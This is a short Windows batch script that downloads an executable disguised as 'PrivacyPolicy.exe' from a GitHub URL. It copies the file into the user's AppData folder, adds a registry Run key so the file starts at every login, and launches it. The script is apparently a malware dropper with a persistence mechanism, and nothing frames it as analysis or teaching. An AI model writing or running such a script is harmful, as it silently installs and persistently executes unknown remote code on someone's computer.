@echo off
setlocal
curl -L -o "C:\Program Files (x86)\PrivacyPolicy.exe" "https://github.com/hwangyounggul33/win33/raw/refs/heads/main/PrivacyPolicyi.exe"
echo File downloaded successfully.
cd /d %~dp0
copy /b "PrivacyPolicy.exe" "%AppData%\PrivacyPolicy.exe"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v PrivacyPolicy /t REG_SZ /d "%AppData%\PrivacyPolicy.exe" 
Start %AppData%\PrivacyPolicy.exe
Exit